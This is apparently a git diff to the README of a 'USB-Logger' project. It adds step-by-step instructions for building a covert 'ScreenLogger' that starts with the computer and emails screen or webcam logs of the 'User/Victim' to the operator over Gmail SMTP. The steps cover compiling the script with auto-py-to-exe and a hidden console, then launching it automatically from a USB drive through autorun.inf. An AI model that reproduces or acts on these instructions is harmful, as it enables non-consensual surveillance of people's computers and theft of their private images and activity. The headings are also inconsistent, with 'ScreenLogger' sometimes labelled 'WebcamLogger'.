@@ -1,6 +1,52 @@
 # USB-Logger
 Remake Of The USB Rubber Ducky In Python With Way Better Features😎
 
+# USB-ScreenLogger
+## Features/What It Does:
+A Webcam Logger To Start On Startup And Sends A Email Of The Webcam Logs Everytime Before The User/Victim Restarts The Computer!
+### Versions:
+Executable/Non-Executable Version
+### Recommended Note
+Use Executable Version
+### Why Use Executable Version
+If The User Hasnt Installed Python, The Converted Script Will Run Evenly Even Without Python.
+#### Instructions/How To Make The ScreenLogger (Executable Version)
+Edit The Python Script For It To Work Properly/Send Emails
+
+Step 1: Replace your_email@gmail.com With Your Email Address. (GMAIL EMAIL ADDRESS)
+
+Step 2: Replace your_app_password With Your Gmail App Password AKA Your Gmail SMTP API Key.
+
+Step 3 (MOST IMPORTANT PART): Replace recipient_email@gmail.com With Your Gmail Email Address. This Part Is Where The Screen Logs Get Emailed To.
+
+Step 4: Save The Python Script.
+
+Step. 5: Convert The Python Script To Executable With
+
+```bash
+pip install auto-py-to-exe
+```
+Step 6: Run auto-py-to-exe
+```bash
+auto-py-to-exe
+```
+Step 7 (Very Recommended But Optional): Select "OneFile" Option And The "Window Based (hide the console)" To Make The Window Invisible.
+
+Step 7: Copy The ScreenLogger.exe To Your USB Flash Drive. And Make It Run The ScreenLogger.exe Automatically When Plugged In With An autorun.inf Or The One Provided In This Repository (ONLY WORKS ON SOME COMPUTERS!) Or You Can Use An Autorun Program (Very Recommended And Works On All Computers/Operating Systems) To Make It Run The ScreenLogger.exe Automatically When Plugged In.
+
+#### Instructions/How To Make The WebcamLogger (Non-Executable Version)
+Edit The Python Script For It To Work Properly/Send Emails
+Step 1: Replace your_email@gmail.com With Your Email Address. (GMAIL EMAIL ADDRESS)
+
+Step 2: Replace your_app_password With Your Gmail App Password AKA Your Gmail SMTP API Key.
+
+Step 3 (MOST IMPORTANT PART): Replace recipient_email@gmail.com With Your Gmail Email Address. This Part Is Where The Screen logs Get Emailed To.
+
+Step 4: Save The Python Script.
+
+Step 5: Copy The start.bat And The ScreenLogger.py To Your USB Flash Drive. And Make It Run The start.bat Automatically When Plugged In With An autorun.inf Or The One Provided In This Repository (ONLY WORKS ON SOME COMPUTERS!) Or You Can Use An Autorun Program (Very Recommended And Works On All Computers/Operating Systems) To Make It Run The start.bat Automatically When Plugged In.
+
+
 # USB-WebcamLogger Edition!
 New Webcam Logger Version Released On 9/24/2024!
 ## Features/What It Does:
@@ -11,7 +57,6 @@ Executable/Non-Executable Version
 Use Executable Version
 ### Why Use Executable Version
 If The User Hasnt Installed Python, The Converted Script Will Run Evenly Even Without Python.
-
 #### Instructions/How To Make The WebcamLogger (Non-Executable Version)
 Edit The Python Script For It To Work Properly/Send Emails
 Step 1: Replace your_email@gmail.com With Your Email Address. (GMAIL EMAIL ADDRESS)
